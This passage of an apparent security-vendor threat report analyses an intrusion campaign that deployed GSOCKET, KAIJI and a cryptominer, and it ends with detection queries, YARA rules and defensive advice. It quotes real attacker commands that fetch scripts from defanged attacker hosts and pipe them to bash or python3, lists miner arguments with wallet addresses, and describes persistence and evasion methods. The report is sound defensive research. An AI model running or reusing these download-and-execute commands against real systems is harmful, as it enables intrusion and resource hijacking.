41qBGWTRXUoUMGXsr78Aie3LYCBSDGZyaQeceMxn11qi9av1adZqsVWCrUwhhwqrt72qTzMbweeqMbA89mnFepja9XERfHL -p R`\n* `-o stratum+tcp://auto.c3pool[.]org:19999 -u 41qBGWTRXUoUMGXsr78Aie3LYCBSDGZyaQeceMxn11qi9av1adZqsVWCrUwhhwqrt72qTzMbweeqMbA89mnFepja9XERfHL -p 2`\n* `-o stratum+tcp://auto.c3pool[.]org:19999 -u 41qBGWTRXUoUMGXsr78Aie3LYCBSDGZyaQeceMxn11qi9av1adZqsVWCrUwhhwqrt72qTzMbweeqMbA89mnFepja9XERfHL -p php`\n* `-o stratum+tcp://auto.c3pool[.]org:19999 -u 42CJPfp1jJ6PXv4cbjXbBRMhp9YUZsXH6V5kEvp7XzNGKLnuTNZQVU9bhxsqBEMstvDwymNSysietQ5VubezYfoq4fT4Ptc -p 0`\n\nEach of these commands directs the miner to connect to the same mining pool but specifies different wallets or configurations. By examining the `c3pool` application, we confirmed that both XMR addresses associated with these commands are currently active and mining.\n\n![C3pool mining revenue](/assets/images/betting-on-bots/image9.png \"C3pool mining revenue\")\n\nAdditionally, through this analysis, we were able to estimate the total profit generated by these two mining campaigns, highlighting the financial impact of the RUDEDEVIL malware and its connection to illegal cryptocurrency mining operations.\n\n## GSOCKET\n\nTo establish persistence, the threat actor downloaded and installed [GSOCKET](https://github.com/hackerschoice/gsocket), a network utility designed to enable encrypted communication between machines that are behind firewalls or NAT. GSOCKET creates secure, persistent connections through the Global Socket Relay Network (GSRN). This open-source tool includes features like AES-256 encryption, support for end-to-end communication security, and compatibility with SSH, netcat, and TOR, which allow for encrypted file transfers, remote command execution, and even the creation of hidden services.\n\nAlthough GSOCKET is not inherently malicious, its features can be leveraged for suspicious purposes.\n\nOnce deployed, GSOCKET performs several actions to maintain persistence and conceal its presence. First, it checks the system for active kernel processes to decide which process it will masquerade as:\n\n![GSOCKET Kernel Process Masquerading](/assets/images/betting-on-bots/image7.png \"GSOCKET Kernel Process Masquerading\")\n\nIt then creates the `/dev/shm/.gs-1000` directory to download and store its binary in shared memory. Additionally, by default, it sets up an `/htop` directory under `/home/user/.config/htop/` to store both the GSOCKET binary and the secret key used for its operations. \n\nNext, a cron job that runs the GSOCKET binary with the secret key every minute is set up.\n\n![GSOCKET Crontab Persistence](/assets/images/betting-on-bots/image21.png \"GSOCKET Crontab Persistence\")\n\nThe binary is executed under the name of a kernel process using the `exec -a [process_name]` command, further enhancing the ability to evade detection. The cron job includes a base64 encoded command that, when decoded, ensures the persistence mechanism is regularly executed and disguised as a legitimate kernel process:\n\nWhen decoding the payload, we see how the `defunct.dat` secret key is used as an argument to execute the `defunct` binary, which is masqueraded as `[raid5wq]` through the use of `exec -a `command:\n\nIn addition to using cron jobs, GSOCKET has the capability to establish persistence through shell profile modification, run control (`rc.local`) and Systemd. GSOCKET enumerates potential persistence locations:\n\n![GSOCKET Persistence Technique Enumeration](/assets/images/betting-on-bots/image29.png \"GSOCKET Persistence Technique Enumeration\")\n\nGSOCKET supports multiple webhooks, such as Telegram or Discord integrations, enabling remote control and notifications:\n\n![GSOCKET Webhook Capabilities](/assets/images/betting-on-bots/image14.png \"GSOCKET Webhook Capabilities\")\n\nFinally, after installation, GSOCKET ensures that all files that are created or modified, will be timestomped to attempt to erase any trace of installation:\n\n![GSOCKET Timestomping Capability](/assets/images/betting-on-bots/image16.png \"GSOCKET Timestomping Capability\")\n\nThese features make GSOCKET an attractive tool for threat actors seeking stealth and persistence. In this campaign, GSOCKET was exploited to establish covert channels back to C2 servers while attempting to evade detection. \n\nAdditionally, a PHP payload was fetched from an external IP and saved as `404.php`, likely functioning as a backdoor for future access. We did not manage to obtain this payload.\n\n### Post compromise dwell time\n\nAfter a three-week period of quiet with no noticeable activity, the threat actors resumed operations by utilizing the built-in Python3 to establish a reverse connection to a new command-and-control server.\n\nAfter regaining access to the host, a newer version of the KAIJI malware was deployed.\n\n### KAIJI malware: a comparison to previous samples\n\nWhile investigating the files on the discovered file server, we saw a shell script. This shell script seems to be the main file used to download by an earlier stage, ensuring the correct architecture for the victim is used.\n\n![KAIJI Download.sh Script](/assets/images/betting-on-bots/image2.png \"KAIJI Download.sh Script\")\n\nThe same Shell script is found in other reports where this script is used to deploy KAIJI.\n\nAs part of our investigation, we analyzed the KAIJI malware samples found on the file server and compared them with samples identified by Black Lotus Labs in 2022. Their detailed analysis of `Chaos` (KAIJI) can be found in their blog post[ here](https://blog.lumen.com/chaos-is-a-go-based-swiss-army-knife-of-malware/).\n\nUsing [BinDiff](https://github.com/google/bindiff), a binary comparison tool, we compared the functions in the binaries. The analysis revealed that the code in our sample was identical to the previously identified KAIJI sample from 2022.\n\n![Bindiff for Old and New Version of KAIJI](/assets/images/betting-on-bots/image18.png \"Bindiff for Old and New Version of KAIJI\")\n\nAlthough the code was the same, one critical difference stood out: the C2 server address. Although the functionality remained consistent in both binaries, they pointed to different C2 domains.\n\nDelving deeper into the disassembly, we identified a function named `main_Link`. This function is responsible for decoding the C2 server address used by the malware.\n\n![KAIJI main_link Function](/assets/images/betting-on-bots/image31.png \"KAIJI main_link Function\")\n\nOnce decoded, the function searches for the `|(odk)/*-` postfix in the address and removes it, leaving only the C2 domain and port. This process ensures the malware can communicate with its C2 server, though the address it contacts may change between samples.\n\nGiven that some resources have been published that statically reverse engineer KAIJI, we will instead take a more detailed look at its behaviors.\n\n![KAIJI Dynamic Analysis - Part 1](/assets/images/betting-on-bots/image12.png \"KAIJI Dynamic Analysis - Part 1\")\n\nAfter execution, KAIJI creates several files in the `/etc/` and `/dev/` directories, `/etc/id.services.conf`, `/etc/32678`, `/dev/.img` and `/dev/.old`. These scripts are places to establish persistence. \n\nTwo services are set up, `/etc/init.d/linux_kill` and `crond.service`. `crond.service` is executed by Systemd, while `linux_kill` is used for SysVinit persistence.\n\nAfter reloading the Systemd daemon, the first network connection to the C2 is attempted.\n\n![KAIJI Dynamic Analysis - Part 2](/assets/images/betting-on-bots/image18.png \"KAIJI Dynamic Analysis - Part 2\")\n\nNext, the `Systemd Late generator` service file is created. More information on the workings of `Systemd`, and different ways of establishing persistence through this method can be found in our recent blog series dubbed [Linux Detection Engineering -  A primer on persistence mechanisms](https://www.elastic.co/security-labs/primer-on-persistence-mechanisms).\n\nKAIJI creates the `/boot/System.img.config` file, which is an executable that is executed through the previously deployed `Systemd` services. This binary, is amongst other binaries, another way of establishing persistence. \n\n![KAIJI Dynamic Analysis - Part 3](/assets/images/betting-on-bots/image26.png \"KAIJI Dynamic Analysis - Part 3\")\n\nNext, KAIJI adjusts the `SELinux` policies to allow unauthorized actions. It searches audit logs for denied operations related to `System.img.conf`, generates a new `SELinux` policy to permit these actions, and installs the policy with elevated priority. By doing this, the malware bypasses security restrictions that would normally block its activity.\n\nAdditionally, it sets up multiple additional forms of persistence through bash profiles, and creates another two malicious artifacts; `/usr/lib/libd1rpcld.so` and `/.img`.\n\nRight after, `/etc/crontab` is altered through an echo command, ensuring that the `/.img` file is executed by root on a set schedule.\n\n![KAIJI Dynamic Analysis - Part 4](/assets/images/betting-on-bots/image20.png \"KAIJI Dynamic Analysis - Part 4\")\n\nKAIJI continues to move several default system binaries to unusual locations, attempting to evade detection along the way.\n\n![KAIJI Dynamic Analysis - Part 5](/assets/images/betting-on-bots/image17.png \"KAIJI Dynamic Analysis - Part 5\")\n\nKAIJI uses the `renice` command to grant PID `2957`, one of KAIJI's planted executables, the highest possible priority (on a scale of -20 to 19, lowest being the highest priority), ensuring it gets more CPU resources than other processes.\n\nTo evade detection, KAIJI employed the bind mount technique, a defense evasion method that obscures malicious activities by manipulating how directories are mounted and viewed within the system.\n\nFinally, we see a trace of `cron` executing the `/.img`, which was planted in the `/etc/crontab` file earlier.\n\n## The saga continues\n\nTwo weeks later, the Apache backdoor became active again. Another backdoor was downloaded via the `www-data` user through the Apache2 process using the command:\n\n```\nsh -c wget http://91.92.241[.]103:8002/gk.php\n```\n\nThe contents of this payload remain unknown. At this stage, we observed attempts at manual privilege escalation, with the attackers deploying `pspy64`. `Pspy` is a command-line tool for process snooping on Linux systems without requiring root permissions. It monitors running processes, including those initiated by other users, and captures events like cron job executions. This tool is particularly useful for analyzing system activity, spotting privilege escalation attempts, and auditing the commands and file system interactions triggered by processes in real time. It's commonly leveraged by attackers for reconnaissance in post-compromise scenarios, giving them visibility into system tasks and potential vulnerabilities​.\n\nNotably, `pspy64` was executed by the `[rcu_preempt]` parent, indicating that the threat actors had transitioned from leveraging the web server backdoor to using the GSOCKET backdoor.\n\nFurther attempts at privilege escalation involved exploiting `CVE-2021-4034`, also known as `pwnkit`. This vulnerability affects the `pkexec` component of the PolicyKit package in Linux systems, allowing an unprivileged user to execute arbitrary code with root privileges. By leveraging this flaw, an attacker can gain elevated access to the system, potentially leading to full control over the affected machine.\n\n### Custom built binaries\n\nRight after, the attackers attempted to download a custom-built malware named `apache2` and `apache2v86` from:\n\n* `http://62.72.22[.]91/apache2`\n* `http://62.72.22[.]91/apache2v86`\n\nWe obtained copies of these files, which currently have zero detections on VirusTotal. However, when executing them dynamically, we observed segmentation faults, and our telemetry confirmed segfault activity on the compromised host. Over a week, the threat actor attempted to alter, upload and execute these binaries more than 15 times, but due to repeated segfaults, it is unlikely that they succeeded in running this custom malware.\n\nWhile the binaries failed to execute, they still provided valuable insights during reverse engineering. We uncovered several XOR-encoded strings within the samples.\n\n![Apache2 XOR-Encoded Strings](/assets/images/betting-on-bots/image33.png \"Apache2 XOR-Encoded Strings\")\n\nThe XOR key used to encode the strings was identified as `0x79` (or the character `y`). After decoding the strings, we discovered fragments of an HTTP request header that the malware was attempting to construct:\n\n```\n/934d9091-c90f-4edf-8b18-d44721ba2cdc HTTP/1.1\nsec-ch-ua: \"Chromium\";v=\"122\", \"Google Chrome\";v=\"122\", \"Not-A.Brand\";v=\"99\nsec-ch-ua-platform: \"Windows\"\nupgrade-insecure-requests: 1\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nreferer: https://twitter[.]com\naccept-language: ru,en-US;q=0.9\nMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.\n```\n\nThis indicates that the malware was in the process of constructing HTTP requests. However, based on the incomplete nature of the headers and the repeated failures in execution, it’s clear that this piece of software was not yet fully developed or operational.\n\n### Additional reconnaissance \n\nThe attackers continued to use tools from The Hacker’s Choice, by downloading and executing [`whatserver.sh`](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/blob/master/tools/whatserver.sh).\n\nThis Shell script is designed to gather and display server information. It extracts details such as the fully qualified domain names (FQDNs) from SSL certificates, Nginx, and Apache configuration files, along with system resource information like CPU and memory usage, virtualization details, and network settings. The script can also summarize recent activities, including last logged-in users and currently listening services.\n\n### Mining activities\n\nAfter nearly two weeks of manual exploitation attempts, the threat actors ceased their efforts to escalate privileges, likely having failed to gain root access. Instead, they established persistence as the `www-data` user, leveraging GSOCKET to set up an SSL connection, which was disguised as a kernel process called `[mm_percpu_wq]`.\n\nAfter decoding the base64 contents, we get a very familiar looking output:\n\nThrough our behavioral rules, we see the threat actor listing the current user’s crontab entries, and echoing a payload directly into the crontab. \n\nThis command tries to download `http://gcp.pagaelrescate[.]com:8080/ifindyou` every minute, and pipe it to bash. Looking at the contents of `ifindyou`, we see the following Bash script:\n\n![Stage 1 - ifindyou.sh](/assets/images/betting-on-bots/image8.png \"Stage 1 - ifindyou.sh\")\n\nThis script gathers hostname and IP information, downloads the `SystemdXC` archive from `http://gcp.pagaelrescate[.]com:8080/t9r/SystemdXC` (XMRIG), stores this in `/tmp/SystemdXC`, extracts the archive and executes it with the necessary parameters to start mining Bitcoin.\n\nWhen examining the mining command, we can see how the malware configures XMRIG:\n\nThis command connects to the `unmineable.com` mining pool, using the infected machine’s hostname as an identifier in the mining process. At the time of writing, there are 15 active workers mining Bitcoin for the wallet address `1CSUkd5FZMis5NDauKLDkcpvvgV1zrBCBz`.\n\n![Bitcoin Address Lookup](/assets/images/betting-on-bots/image1.png \"Bitcoin Address Lookup\")\n\nUpon further investigation into the Bitcoin address, we found that this address has performed a single transaction.\n\n![Bitcoin Transaction](/assets/images/betting-on-bots/image32.png \"Bitcoin Transaction\")\n\nInterestingly, the output address for this transaction points to a well-known [hot wallet](https://www.ledger.com/academy/topics/security/hot-wallet-vs-cold-crypto-wallet-whats-the-difference) associated with Binance, indicating that the attackers may have transferred their mining earnings to an exchange platform.\n\n![Binance Wallet Destination](/assets/images/betting-on-bots/image10.png \"Binance Wallet Destination\")\n\nWhen returning our focus back to the script, we also see two commands commented out, which will become more clear later. The script executes:\n\n```\ncurl -s http://gcp.pagaelrescate[.]com:8080/cycnet | bash\n```\n\nLooking at this payload, we can see the following contents:\n\n![Stage 2 - cycnet.sh](/assets/images/betting-on-bots/image23.png \"Stage 2 - cycnet.sh\")\n\nThis stage checks the output of the command, and sends this to a Telegram chat bot. Through our Telegram behavioral rule, we can see that a Telegram POST request looks like this:\n\nThe cron job that is set up during this stage executes at minute 0, every 4th hour. This job executes:\n\n```\ncurl -s http://gcp.pagaelrescate[.]com:8080/testslot/enviador_slot | python3\n```\n\nThe downloaded Python script automates interactions with an online gambling game through HTTP requests. The script includes functions that handle user authentication, betting, processing the outcomes, and sending data to a remote server.\n\nUpon closer examination, we identified the following key components of the script:\n\n**Global Variables:**\n\n* `usuario`: Stores the user ID for managing the session.\n* `apuesta`: Represents the bet amount.\n* `ganancias`: Tracks the winnings and losses.\n* `saldo_actual`: Holds the current account balance.\n\n![enviador_slot Global Variables](/assets/images/betting-on-bots/image3.png \"enviador_slot Global Variables\")\n\n#### Understanding the `obteneruid` Function\n\nThis function authenticates the user by sending a POST request with the necessary headers and JSON data to the remote server. If the user is not already set, it initializes a new session and retrieves the account balance. Upon successful authentication, it returns a session UUID, which is used for further interactions in the game.\n\n\n![enviador_slot obteneruid Function](/assets/images/betting-on-bots/image27.png \"enviador_slot obteneruid Function\")\n\n#### Understanding the `enviardatos` Function\n\nThis function sends game data or status updates back to `gcp.pagaelrescate[.]com`, logging the results or actions taken during gameplay. It uses a simple GET request to transmit this data to the remote server.\n\n![enviador_slot enviardatos Function](/assets/images/betting-on-bots/image4.png \"enviador_slot enviardatos Function\")\n\n#### Understanding the `hacerjugada` Function\n\nThe `hacerjugada` function simulates the betting process for a set number of rounds. It sends POST requests to place bets, updates the winnings or losses after each round, and calculates the overall results. If a bonus round is triggered, it calls `completarbono()` to handle any bonus game details. Between each betting round, the function enforces a 30-second delay to mimic natural gameplay and avoid detection.\n\n![enviador_slot hacerjugada Function](/assets/images/betting-on-bots/image28.png \"enviador_slot hacerjugada Function\")\n\n#### Understanding the `completarbono` Function\n\nWhen a bonus round is triggered, this function completes the round by sending a request containing the session ID and round ID. Based on the result, it updates the account balance and logs the winnings or losses. Any change in the balance is sent back to the remote server using the `enviardatos()` function.\n\n![enviador_slot completarbono Function](/assets/images/betting-on-bots/image6.png \"enviador_slot completarbono Function\")\n\n#### Likely Used for Testing Purposes\n\nIt’s important to note that this script is likely being used for testing purposes, as it interacts with the demo version of the gambling app. This suggests that the attackers might be testing the automation of gambling actions or trying to find vulnerabilities in the app before moving to the live version. The use of a demo environment implies they are refining their approach, potentially in preparation for more sophisticated or widespread attacks.\n\n## REF6138 through MITRE ATT\u0026CK\n\nElastic uses the [MITRE ATT\u0026CK](https://attack.mitre.org/) framework to document common tactics, techniques, and procedures that advanced persistent threats use against enterprise networks. During this investigation, we identified the following tactics, techniques and sub-techniques:\n\n*MITRE ATT\u0026CK tactics, techniques and sub-techniques used*\n\n| Tactic               | Technique                                          | Sub-Technique                                                                      |\n|----------------------|----------------------------------------------------|------------------------------------------------------------------------------------|\n| Resource Development | T1587: Develop Capabilities                        | Malware                                                                            |\n|                      | T1588: Obtain Capabilities                         | Tool                                                                               |\n|                      | T1608: Stage Capabilities                          | Upload Malware                                                                     |\n|                      |                                                    | Upload Tool                                                                        |\n| Initial Access       | T1190: Exploit Public-Facing Application           |                                                                                    |\n| Execution            | T1059: Command and Scripting Interpreter           | Unix Shell                                                               |\n|             |            | Python                                                               |\n|                      | T1053: Scheduled Task/Job                          | Cron                                                                               |\n| Persistence          | T1546: Event Triggered Execution                   | Unix Shell Configuration Modification                                              |\n|                      | T1053: Scheduled Task/Job                          | Cron                                                                               |\n|                      | T1505: Server Software Component                   | Web Shell                                                                          |\n| Privilege Escalation | T1068: Exploitation for Privilege Escalation       |                                                                                    |\n| Defense Evasion      | T1140: Deobfuscate/Decode Files or Information     |                                                                                    |\n|                      | T1222: File and Directory Permissions Modification | Linux and Mac File and Directory Permissions Modification                          |\n|                      | T1564: Hide Artifacts                              | Hidden Files and Directories                                                       |\n|                      | T1070: Indicator Removal                           | Timestomp                                                                          |\n|                      | T1036: Masquerading                                | Masquerade Task or Service                                                         |\n|                      | T1027: Obfuscated Files or Information             | Software Packing |\n|                      |              | Stripped Payloads |\n|                      |              | Command Obfuscation |\n|                      |              | Encrypted/Encoded File |\n| Discovery            | T1057: Process Discovery                           |                                                                                    |\n|                      | T1082: System Information Discovery                |                                                                                    |\n|                      | T1061: System Network Configuration Discovery      |                                                                                    |\n|                      | T1049: System Network Connections Discovery        |                                                                                    |\n|                      | T1007: System Service Discovery                    |                                                                                    |\n| Collection           | T1119: Automated Collection                        |                                                                                    |\n|                      | T1005: Data from Local System                      |                                                                                    |\n| Command and Control  | T1071: Application Layer Protocol                  | Web Protocols                                                                      |\n|                      | T1132: Data Encoding                               | Standard Encoding                                                                  |\n|                      | T1001: Data Obfuscation                            |                                                                                    |\n|                      | T1573: Encrypted Channel                           | Symmetric Cryptography                                                             |\n|                      | T1105: Ingress Tool Transfer                       |                                                                                    |\n|                      | T1571: Non-Standard Port                           |                                                                                    |\n|                      | T1572: Protocol Tunneling                          |                                                                                    |\n|                      | T1102: Web Service                                 |                                                                                    |\n| Impact               | T1496: Resource Hijacking                          |                                                                                    |\n\n## **Detecting REF6138**\n\nElastic Security implements a multi-layer approach to threat detection, leveraging behavioral SIEM and Endpoint rules, YARA signatures and ML-based anomaly detection approaches. This section describes the detections built by Elastic Security that play a big role in capturing the identified threats.\n\n### Detection\n\nThe following detection rules were observed throughout the analysis of this intrusion set:\n\n* [Segfault Detection](https://github.com/elastic/detection-rules/blob/main/rules_building_block/execution_linux_segfault.toml)\n* [Timestomping using Touch Command](https://github.com/elastic/detection-rules/blob/main/rules/cross-platform/defense_evasion_timestomp_touch.toml)\n* [Shell Configuration Creation or Modification](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_shell_configuration_modification.toml)\n* [System Binary Moved or Copied](https://github.com/elastic/detection-rules/blob/main/rules/linux/defense_evasion_binary_copied_to_suspicious_directory.toml)\n\n### Prevention\n\nThe following behavior prevention events were observed throughout the analysis of this intrusion set:\n\n* [Linux Reverse Shell via Suspicious Utility](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/execution_linux_reverse_shell_via_suspicious_utility.toml)\n* [Defense Evasion via Bind Mount](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/defense_evasion_defense_evasion_via_bind_mount.toml)\n* [Linux Suspicious Child Process Execution via Interactive Shell](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/execution_linux_suspicious_child_process_execution_via_interactive_shell.toml)\n* [Potential Linux Hack Tool Launched](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/execution_potential_linux_hack_tool_launched.toml)\n* [Privilege Escalation via PKEXEC Exploitation](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/privilege_escalation_privilege_escalation_via_pkexec_exploitation.toml)\n* [Potential SSH-IT SSH Worm Downloaded](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/lateral_movement_potential_ssh_it_ssh_worm_downloaded.toml)\n* [Scheduled Job Executing Binary in Unusual Location](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_scheduled_job_executing_binary_in_unusual_location.toml)\n\nThe following YARA Signatures are in place to detect the KAIJI and RUDEDEVIL malware samples both as file and in-memory:\n\n* [Linux.Generic.Threat](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Linux_Generic_Threat.yar)\n* [Linux.Hacktool.Flooder](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Linux_Hacktool_Flooder.yar)\n\nThe following, soon to be released, endpoint rule alerts were observed throughout the analysis of this intrusion set:\n\n* Potential Shell via Web Server\n* Potential Web Server Code Injection\n* Potential Shell Executed by Web Server User\n* Decode Activity via Web Server\n* Linux Telegram API Request\n* Suspicious Echo Execution\n\n### Hunting queries in Elastic\n\nThe events for both KQL and EQL are provided with the Elastic Agent using the Elastic Defend integration. Hunting queries could return high signals or false positives. These queries are used to identify potentially suspicious behavior, but an investigation is required to validate the findings.\n\n#### EQL queries\n\nUsing the Timeline section of the Security Solution in Kibana under the “Correlation” tab, you can use the below EQL queries to hunt for behaviors similar:\n\n**Potential XMRIG Execution**\n\nThe following EQL query can be used to hunt for XMRIG executions within your environment.\n\n```\nprocess where event.type == \"start\" and event.action == \"exec\" and (\n  (\n    process.args in (\"-a\", \"--algo\") and process.args in (\n      \"gr\", \"rx/graft\", \"cn/upx2\", \"argon2/chukwav2\", \"cn/ccx\", \"kawpow\", \"rx/keva\", \"cn-pico/tlo\", \"rx/sfx\", \"rx/arq\",\n      \"rx/0\", \"argon2/chukwa\", \"argon2/ninja\", \"rx/wow\", \"cn/fast\", \"cn/rwz\", \"cn/zls\", \"cn/double\", \"cn/r\", \"cn-pico\",\n      \"cn/half\", \"cn/2\", \"cn/xao\", \"cn/rto\", \"cn-heavy/tube\", \"cn-heavy/xhv\", \"cn-heavy/0\", \"cn/1\", \"cn-lite/1\",\n      \"cn-lite/0\", \"cn/0\"\n    )\n  ) or\n  (\n    process.args == \"--coin\" and process.args in (\"monero\", \"arqma\", \"dero\")\n  )\n) and process.args in (\"-o\", \"--url\")\n```\n\n**MSR Write Access Enabled**\n\nXMRIG leverages modprobe to enable write access to MSR. This activity is abnormal, and should not occur by-default.\n\n```\nprocess where event.type == \"start\" and event.action == \"exec\" and process.name == \"modprobe\" and\nprocess.args == \"msr\" and process.args == \"allow_writes=on\"\n```\n\n**Potential GSOCKET Activity**\n\nThis activity is default behavior when deploying GSOCKET through the recommended deployment methods. Additionally, several arguments are added to the query to decrease the chances of missing a more customized intrusion through GSOCKET. \n\n```\nprocess where event.type == \"start\" and event.action == \"exec\" and\nprocess.name in (\"bash\", \"dash\", \"sh\", \"tcsh\", \"csh\", \"zsh\", \"ksh\", \"fish\") and\nprocess.command_line : (\n\"*GS_ARGS=*\", \"*gs-netcat*\", \"*gs-sftp*\", \"*gs-mount*\", \"*gs-full-pipe*\", \"*GS_NOINST=*\", \"*GSOCKET_ARGS=*\", \"*GS_DSTDIR=*\", \"*GS_URL_BASE=*\", \"*GS_OSARCH=*\", \"*GS_DEBUG=*\", \"*GS_HIDDEN_NAME=*\", \"*GS_HOST=*\", \"*GS_PORT=*\", \"*GS_TG_TOKEN=*\", \"*GS_TG_CHATID=*\", \"*GS_DISCORD_KEY=*\", \"*GS_WEBHOOK_KEY=*\"\n)\n```\n\n**Potential Process Masquerading via Exec**\n\nGSOCKET leverages the `exec -a` method to run a process under a different name. GSOCKET specifically leverages masquerades as kernel processes, but other malware may masquerade differently. \n\n```\nprocess where event.type == \"start\" and event.action == \"exec\" and\nprocess.name in (\"bash\", \"dash\", \"sh\", \"tcsh\", \"csh\", \"zsh\", \"ksh\", \"fish\") and process.args == \"-c\" and process.command_line : \"* exec -a *\"\n```\n\n**Renice or Ulimit Execution**\n\nSeveral malwares, including KAIJI and RUDEDEVIL, leverage the renice utility to change the priority of processes or set resource limits for processes. This is commonly used by miner malware to increase the priority of mining processes to maximize the mining performance.\n\n```\nprocess where event.type == \"start\" and event.action == \"exec\" and (\n  process.name in (\"ulimit\", \"renice\") or (\n  process.name in (\"bash\", \"dash\", \"sh\", \"tcsh\", \"csh\", \"zsh\", \"ksh\", \"fish\") and process.args == \"-c\" and\n  process.command_line : (\"*ulimit*\", \"*renice*\")\n  )\n)\n```\n\n**Inexistent Cron(d) Service Started**\n\nBoth KAIJI and RUDEDEVIL establish persistence through the creation of a `cron(d)` service in `/etc/init.d/cron(d)`. `Cron`, by default, does not use a `SysV Init` service. Execution of a `cron(d)` service is suspicious, and should be analyzed further.\n\n```\nprocess where event.type == \"start\" and event.action == \"exec\" and \n  process.name == \"systemctl\" and process.args == \"start\" and process.args in \n  (\"cron.service\", \"crond.service\", \"cron\", \"crond\")\n```\n\n**Suspicious /etc/ Process Execution from KAIJI**\n\nThe `/etc/` directory is not a commonly used directory for process executions. KAIJI is known to place a binary called `32678` and `id.services.conf` in the `/etc/` directory, to establish persistence and evade detection.\n\n```\nprocess where event.type == \"start\" and event.action == \"exec\" and (process.executable regex \"\"\"/etc/[0-9].*\"\"\" or process.executable : (\"/etc/*.conf\", \"/etc/.*\"))\n```\n\n**Hidden File Creation in /dev/ directory**\n\nCreating hidden files in `/dev/` and `/dev/shm/` are not inherently malicious, however, this activity should be uncommon. KAIJI, GSOCKET and other malwares such as `K4SPREADER` are known to drop hidden files in these locations.\n\n```\nfile where event.type == \"creation\" and file.path : (\"/dev/shm/.*\", \"/dev/.*\")\n```\n\n**Suspicious Process Execution from Parent Executable in /boot/**\n\nMalwares such as KAIJI and XORDDOS are known to place executable files in the `/boot/` directory, and leverage these to establish persistence while attempting to evade detection.\n\n```\nprocess where event.type == \"start\" and event.action == \"exec\" and process.parent.executable : \"/boot/*\"\n```\n\n#### YARA\n\nElastic Security has created YARA rules to identify this activity. Below is the YARA rule to identify the custom `Apache2` malware:\n\n```\nrule Linux_Trojan_Generic {\n    meta:\n        author = \"Elastic Security\"\n        creation_date = \"2024-09-20\"\n        last_modified = \"2024-09-20\"\n        os = \"Linux\"\n        arch = \"x86\"\n        threat_name = \"Linux.Trojan.Generic\"\n        reference = \"https://www.elastic.co/security-labs/betting-on-bots\"\n        license = \"Elastic License v2\"\n\n    strings:\n        $enc1 = { 74 73 0A 1C 1A 54 1A 11 54 0C 18 43 59 5B 3A 11 0B 16 14 10 0C 14 5B }\n        $enc2 = { 18 1A 1A 1C 09 0D 43 59 0D 1C 01 0D 56 11 0D 14 15 55 18 09 09 15 10 }\n        $enc3 = { 18 1A 1A 1C 09 0D 54 15 18 17 1E 0C 18 1E 1C 43 59 0B 0C }\n        $enc4 = { 34 16 03 10 15 15 18 56 4C 57 49 59 51 2E 10 17 1D 16 0E 0A 59 37 }\n        $key = \"yyyyyyyy\"\n    condition:\n        1 of ($enc*) and $key\n}\n```\n\nTo detect GSOCKET, including several of its adjacent tools, we created the following signature:\n\n```\nrule Multi_Hacktool_Gsocket {\n    meta:\n        author = \"Elastic Security\"\n        creation_date = \"2024-09-20\"\n        last_modified = \"2024-09-23\"\n        os = \"Linux, MacOS\"\n        arch = \"x86\"\n        threat_name = \"Multi.Hacktool.Gsocket\"\n        reference = \"https://www.elastic.co/security-labs/betting-on-bots\"\n        license = \"Elastic License v2\"\n\n    strings:\n        $str1 = \"gsocket: gs_funcs not found\"\n        $str2 = \"/share/gsocket/gs_funcs\"\n        $str3 = \"$GSOCKET_ARGS\"\n        $str4 = \"GSOCKET_SECRET\"\n        $str5 = \"GS_HIJACK_PORTS\"\n        $str6 = \"sftp -D gs-netcat\"\n        $str7 = \"GS_NETCAT_BIN\"\n        $str8 = \"GSOCKET_NO_GREETINGS\"\n        $str9 = \"GS-NETCAT(1)\"\n        $str10 = \"GSOCKET_SOCKS_IP\"\n        $str11 = \"GSOCKET_SOCKS_PORT\"\n        $str12 = \"gsocket(1)\"\n        $str13 = \"gs-sftp(1)\"\n        $str14 = \"gs-mount(1)\"\n    condition:\n        3 of them\n}\n```\n\nFinally, the following signature was written to detect the [open source Ligolo-ng tool](https://github.com/nicocha30/ligolo-ng), as we have reason to believe this tool was used during this intrusion.\n\n\n```\nrule Linux_Hacktool_LigoloNG {\n    meta:\n        author = \"Elastic Security\"\n        creation_date = \"2024-09-20\"\n        last_modified = \"2024-09-20\"\n        os = \"Linux\"\n        arch = \"x86\"\n        threat_name = \"Linux.Hacktool.LigoloNG\"\n        reference = \"https://www.elastic.co/security-labs/betting-on-bots\"\n        license = \"Elastic License v2\"\n\n    strings:\n        $a = \"https://github.com/nicocha30/ligolo-ng\"\n        $b = \"@Nicocha30!\"\n        $c = \"Ligolo-ng %s / %s / %s\"\n    condition:\n        all of them\n}\n```\n\n### Defensive recommendations\n\nTo effectively defend against malware campaigns and minimize the risk of intrusion, it’s crucial to implement a multi-layered approach to security. Here are some key defensive measures you should prioritize:\n\n1. **Keep Your Elastic Detection Rules Updated and Enabled**: Ensure that your security tools, including any pre-built detection rules, are up to date. Continuous updates allow your systems to detect the latest malware signatures and behaviors.\n2. **Enable Prevention Mode in Elastic Defend**: Configure Elastic Defend in prevention mode to automatically block known threats rather than just alerting on them. Prevention mode ensures proactive defense against malware and exploits.\n3. **Monitor Alerts and Logs**: Regularly monitor alerts, logs, and servers for any signs of suspicious activity. Early detection of unusual behavior can help prevent a small breach from escalating into a full-blown compromise.\n4. **Conduct Threat Hunting**: Proactively investigate your environment for hidden threats that may have evaded detection. Threat hunting can uncover advanced attacks and persistent malware that bypass traditional security measures.\n5. **Implement Web Application Firewalls (WAFs)**: Use a WAF to block unauthorized or malicious traffic. A properly configured firewall can prevent many common web attacks.\n6. **Enforce Strong Authentication for SSH**: Use public/private key authentication for SSH access to protect against brute force attacks.\n7. **Write Secure Code**: Ensure that all custom software, especially web server technology, follows secure coding 